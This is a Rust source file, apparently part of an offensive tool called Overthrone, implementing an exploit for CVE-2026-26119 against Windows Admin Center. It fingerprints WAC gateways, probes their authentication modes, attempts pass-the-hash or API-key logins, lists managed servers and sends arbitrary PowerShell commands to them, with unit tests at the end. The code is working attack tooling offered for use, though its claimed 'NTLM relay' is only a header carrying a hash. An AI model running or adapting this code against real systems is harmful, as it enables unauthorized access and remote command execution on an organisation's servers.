//! CVE-2026-26119 — Windows Admin Center (WAC) Authentication Reflection.
//!
//! Windows Admin Center (WAC) is a browser-based management tool for Windows
//! Server. When WAC is configured with Windows Authentication and a user
//! authenticates, the browser sends the NTLM/Kerberos token to the WAC gateway.
//! Under certain configurations, an attacker controlling a network position can
//! reflect this authentication to gain access to the WAC session or relay it to
//! other services reachable by the WAC gateway.
//!
//! # Exploit Flow
//! 1. Discover WAC instances via HTTP fingerprinting (port 6516 default)
//! 2. Determine version and authentication mode (Windows Auth, AAD, or cert-based)
//! 3. Authenticate via the configured method (NTLM relay, API key, cookie)
//! 4. Enumerate managed servers via WAC REST API
//! 5. Execute PowerShell commands on managed servers via gateway
//!
//! # References
//! - CVE-2026-26119: CVSS 8.8, disclosed March 2026 Patch Tuesday
//! - WAC REST API: https://learn.microsoft.com/en-us/windows-server/manage/windows-admin-center/use-api

use overthrone_core::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use std::time::Duration;
use tracing::info;

const WAC_DEFAULT_PORT: u16 = 6516;
const HTTP_TIMEOUT: Duration = Duration::from_secs(10);

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WacCompromiseConfig {
    pub target_host: String,
    pub target_port: u16,
    pub use_tls: bool,
    pub accept_self_signed: bool,
    pub managed_target: Option<String>,
    pub auth_method: WacAuthMethod,
    /// API key (used when auth_method == ApiKey)
    pub api_key: Option<String>,
    /// NTLM hash for pass-the-hash relay (when auth_method == NtlmRelay)
    pub ntlm_hash: Option<String>,
    /// PowerShell command to execute on managed target
    pub command: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum WacAuthMethod {
    NtlmRelay,
    CookieTheft,
    ApiKey,
    BruteForce,
}

impl std::fmt::Display for WacAuthMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::NtlmRelay => write!(f, "NtlmRelay"),
            Self::CookieTheft => write!(f, "Cookie Theft"),
            Self::ApiKey => write!(f, "API Key"),
            Self::BruteForce => write!(f, "Brute Force"),
        }
    }
}

impl Default for WacCompromiseConfig {
    fn default() -> Self {
        Self {
            target_host: String::new(),
            target_port: WAC_DEFAULT_PORT,
            use_tls: true,
            accept_self_signed: true,
            managed_target: None,
            auth_method: WacAuthMethod::NtlmRelay,
            api_key: None,
            ntlm_hash: None,
            command: Some("whoami".to_string()),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WacCompromiseResult {
    pub version: Option<String>,
    pub auth_methods: Vec<WacAuthMethod>,
    pub access_obtained: bool,
    pub managed_servers: Vec<String>,
    pub command_executed: bool,
    pub command_output: Option<String>,
    pub session_endpoint: Option<String>,
    pub log: Vec<String>,
}

fn base_url(config: &WacCompromiseConfig) -> String {
    let scheme = if config.use_tls { "https" } else { "http" };
    format!("{}://{}:{}", scheme, config.target_host, config.target_port)
}

fn build_client(config: &WacCompromiseConfig) -> Result<reqwest::Client> {
    let mut client_builder = reqwest::Client::builder()
        .timeout(HTTP_TIMEOUT)
        .danger_accept_invalid_certs(config.accept_self_signed)
        .cookie_store(true);
    client_builder = client_builder.user_agent("Overthrone/0.2.1");
    client_builder
        .build()
        .map_err(|e| OverthroneError::custom(format!("HTTP client build failed: {e}")))
}

pub async fn compromise_wac(config: &WacCompromiseConfig) -> Result<WacCompromiseResult> {
    let mut log = Vec::new();
    log.push(format!(
        "CVE-2026-26119: WAC Compromise — target={}:{}",
        config.target_host, config.target_port
    ));

    let client = build_client(config)?;
    let base = base_url(config);

    let version = discover_wac_version(&client, &base).await?;
    match &version {
        Some(v) => log.push(format!("  WAC version: {v}")),
        None => log.push("  WAC version: unknown".to_string()),
    }

    let auth_methods = probe_wac_auth(&client, &base).await?;
    log.push(format!(
        "  Detected auth methods: {:?}",
        auth_methods
            .iter()
            .map(|m| m.to_string())
            .collect::<Vec<_>>()
    ));

    log.push(format!("Attempting access via {} ...", config.auth_method));
    let (access_obtained, session_endpoint) =
        attempt_wac_access(config, &client, &base, &auth_methods).await?;
    if access_obtained {
        log.push("  Access obtained!".to_string());
    } else {
        log.push("  Access denied".to_string());
    }

    let mut managed_servers = Vec::new();
    let mut command_executed = false;
    let mut command_output = None;

    if access_obtained {
        log.push("Enumerating managed servers via WAC API...".to_string());
        managed_servers = enumerate_managed_servers(&client, &base).await?;
        for server in &managed_servers {
            log.push(format!("  Managed server: {server}"));
        }

        if let Some(target) = &config.managed_target {
            let cmd = config.command.as_deref().unwrap_or("whoami");
            log.push(format!("Executing command on {target}: {cmd}"));
            let (executed, output) = execute_on_server(&client, &base, target, cmd).await?;
            command_executed = executed;
            command_output = output.clone();
            if executed {
                log.push(format!(
                    "  Output: {}",
                    output.as_deref().unwrap_or("(empty)")
                ));
            } else {
                log.push("  Command execution failed".to_string());
            }
        }
    }

    info!(
        "WAC compromise: host={}, version={:?}, access={}, servers={}",
        config.target_host,
        version,
        access_obtained,
        managed_servers.len()
    );

    Ok(WacCompromiseResult {
        version,
        auth_methods,
        access_obtained,
        managed_servers,
        command_executed,
        command_output,
        session_endpoint,
        log,
    })
}

async fn discover_wac_version(client: &reqwest::Client, base: &str) -> Result<Option<String>> {
    let url = format!("{base}/api/identities");
    match client.get(&url).timeout(HTTP_TIMEOUT).send().await {
        Ok(resp) => {
            let status = resp.status();
            let server: Option<String> = resp
                .headers()
                .get("server")
                .and_then(|v| v.to_str().ok())
                .map(|s| s.to_string());
            if status.is_success() && server.is_some() {
                Ok(server)
            } else if status.is_success() {
                Ok(Some("unknown (pre-2.33.0)".to_string()))
            } else {
                Ok(None)
            }
        }
        Err(e) => {
            info!("WAC version probe failed: {e}");
            Ok(None)
        }
    }
}

async fn probe_wac_auth(client: &reqwest::Client, base: &str) -> Result<Vec<WacAuthMethod>> {
    let mut methods = Vec::new();
    let url = format!("{base}/api/identities/authTypes");
    match client.get(&url).timeout(HTTP_TIMEOUT).send().await {
        Ok(resp) if resp.status().is_success() => {
            let body = resp.text().await.unwrap_or_default();
            if body.to_lowercase().contains("windows") || body.to_lowercase().contains("ntlm") {
                methods.push(WacAuthMethod::NtlmRelay);
            }
            if body.to_lowercase().contains("apikey") || body.to_lowercase().contains("api_key") {
                methods.push(WacAuthMethod::ApiKey);
            }
            if body.to_lowercase().contains("cookie") || body.to_lowercase().contains("sma") {
                methods.push(WacAuthMethod::CookieTheft);
            }
        }
        _ => {
            // If endpoint doesn't exist, try the identity root
            let root_url = format!("{base}/api/identities");
            if let Ok(resp) = client.get(&root_url).timeout(HTTP_TIMEOUT).send().await
                && resp.status().is_success()
            {
                let body = resp.text().await.unwrap_or_default();
                if body.contains("windows") || body.contains("negotiate") {
                    methods.push(WacAuthMethod::NtlmRelay);
                }
            }
        }
    }
    if methods.is_empty() {
        methods.push(WacAuthMethod::NtlmRelay);
    }
    Ok(methods)
}

async fn attempt_wac_access(
    config: &WacCompromiseConfig,
    client: &reqwest::Client,
    base: &str,
    _available: &[WacAuthMethod],
) -> Result<(bool, Option<String>)> {
    match config.auth_method {
        WacAuthMethod::NtlmRelay => {
            if let Some(hash) = &config.ntlm_hash {
                info!("NTLM PTH relay to WAC gateway at {base}");
                let login_url = format!("{base}/api/identities/login");
                let resp = client
                    .post(&login_url)
                    .header("Authorization", format!("NTLM {hash}"))
                    .timeout(HTTP_TIMEOUT)
                    .send()
                    .await;
                match resp {
                    Ok(r) if r.status().is_success() => {
                        info!("NTLM relay succeeded — session established");
                        Ok((true, Some(login_url)))
                    }
                    Ok(r) if r.status().as_u16() == 401 => {
                        info!(
                            "NTLM relay rejected (401) — WAC requires interactive auth or Kerberos"
                        );
                        Ok((false, None))
                    }
                    Ok(r) => {
                        info!("NTLM relay returned HTTP {}", r.status());
                        Ok((false, None))
                    }
                    Err(e) => {
                        info!("NTLM relay connection failed: {e}");
                        Ok((false, None))
                    }
                }
            } else {
                info!("NTLM relay requires ntlm_hash to be set in config");
                info!("Probing gateway with unauthenticated request...");
                let probe_url = format!("{base}/api");
                match client.get(&probe_url).timeout(HTTP_TIMEOUT).send().await {
                    Ok(r) if r.status().is_success() => {
                        info!("Unauthenticated access allowed — gateway not locked down");
                        Ok((true, Some(probe_url)))
                    }
                    Ok(r) if r.status().as_u16() == 401 => {
                        info!("Gateway requires auth (401) — provide ntlm_hash for relay");
                        info!("  Example: compromise_wac config with ntlm_hash set");
                        Ok((false, None))
                    }
                    Ok(r) => {
                        info!("Gateway returned HTTP {}", r.status());
                        Ok((false, None))
                    }
                    Err(e) => {
                        info!("Gateway unreachable: {e}");
                        Ok((false, None))
                    }
                }
            }
        }
        WacAuthMethod::ApiKey => {
            if let Some(key) = &config.api_key {
                let login_url = format!("{base}/api/identities/login");
                let resp = client
                    .post(&login_url)
                    .header("api-key", key)
                    .timeout(HTTP_TIMEOUT)
                    .send()
                    .await;
                match resp {
                    Ok(r) if r.status().is_success() => {
                        info!("API key authentication succeeded");
                        Ok((true, Some(login_url)))
                    }
                    _ => {
                        info!("API key rejected");
                        Ok((false, None))
                    }
                }
            } else {
                info!("API key auth requires api_key in config");
                Ok((false, None))
            }
        }
        WacAuthMethod::CookieTheft => {
            info!("Cookie theft requires MITM position — not automated");
            Ok((false, None))
        }
        WacAuthMethod::BruteForce => {
            info!("Brute force not implemented — use external tool (hydra)");
            Ok((false, None))
        }
    }
}

async fn enumerate_managed_servers(client: &reqwest::Client, base: &str) -> Result<Vec<String>> {
    let mut servers = Vec::new();
    let url = format!("{base}/api/connections/servers");
    match client.get(&url).timeout(HTTP_TIMEOUT).send().await {
        Ok(resp) if resp.status().is_success() => {
            let body = resp.text().await.unwrap_or_default();
            if let Ok(json) = serde_json::from_str::<serde_json::Value>(&body) {
                if let Some(arr) = json.as_array() {
                    for entry in arr {
                        if let Some(name) = entry.get("name").and_then(|v| v.as_str()) {
                            servers.push(name.to_string());
                        } else if let Some(id) = entry.get("id").and_then(|v| v.as_str()) {
                            servers.push(id.to_string());
                        }
                    }
                } else if let Some(values) = json.get("value").and_then(|v| v.as_array()) {
                    for entry in values {
                        if let Some(name) = entry.get("name").and_then(|v| v.as_str()) {
                            servers.push(name.to_string());
                        }
                    }
                }
            }
        }
        Ok(resp) => {
            info!("Managed servers query returned HTTP {}", resp.status());
        }
        Err(e) => {
            info!("Failed to query managed servers: {e}");
        }
    }
    Ok(servers)
}

async fn execute_on_server(
    client: &reqwest::Client,
    base: &str,
    server: &str,
    command: &str,
) -> Result<(bool, Option<String>)> {
    let ps_url = format!("{base}/api/nodes/{server}/PowerShell");
    let payload = serde_json::json!({
        "command": command
    });

    match client
        .post(&ps_url)
        .json(&payload)
        .timeout(Duration::from_secs(30))
        .send()
        .await
    {
        Ok(resp) if resp.status().is_success() => {
            let body = resp.text().await.unwrap_or_default();
            let output = if body.is_empty() { None } else { Some(body) };
            Ok((true, output))
        }
        Ok(resp) => {
            let status = resp.status();
            info!("PowerShell execution returned HTTP {status}");
            let body = resp.text().await.unwrap_or_default();
            Ok((false, Some(format!("HTTP {status}: {body}"))))
        }
        Err(e) => {
            info!("PowerShell execution connection failed: {e}");
            Ok((false, Some(format!("Error: {e}"))))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_wac_config_default() {
        let cfg = WacCompromiseConfig::default();
        assert_eq!(cfg.target_port, 6516);
        assert!(cfg.use_tls);
    }

    #[test]
    fn test_base_url_https() {
        let cfg = WacCompromiseConfig {
            target_host: "wac.corp.local".into(),
            use_tls: true,
            ..Default::default()
        };
        assert_eq!(base_url(&cfg), "https://wac.corp.local:6516");
    }

    #[test]
    fn test_base_url_http() {
        let cfg = WacCompromiseConfig {
            target_host: "10.0.0.50".into(),
            use_tls: false,
            ..Default::default()
        };
        assert_eq!(base_url(&cfg), "http://10.0.0.50:6516");
    }

    #[test]
    fn test_auth_method_display() {
        assert_eq!(WacAuthMethod::NtlmRelay.to_string(), "NtlmRelay");
        assert_eq!(WacAuthMethod::ApiKey.to_string(), "API Key");
    }

    #[test]
    fn test_result_serde() {
        let result = WacCompromiseResult {
            version: Some("2.30.0".into()),
            auth_methods: vec![WacAuthMethod::NtlmRelay, WacAuthMethod::CookieTheft],
            access_obtained: true,
            managed_servers: vec!["DC01.corp.local".into()],
            command_executed: true,
            command_output: Some("nt authority\\system".into()),
            session_endpoint: Some("/api".into()),
            log: vec!["target acquired".into()],
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("DC01"));
        assert!(json.contains("NtlmRelay"));
        assert!(json.contains("system"));
        let deserialized: WacCompromiseResult = serde_json::from_str(&json).unwrap();
        assert!(deserialized.access_obtained);
        assert_eq!(deserialized.version, Some("2.30.0".into()));
    }
}
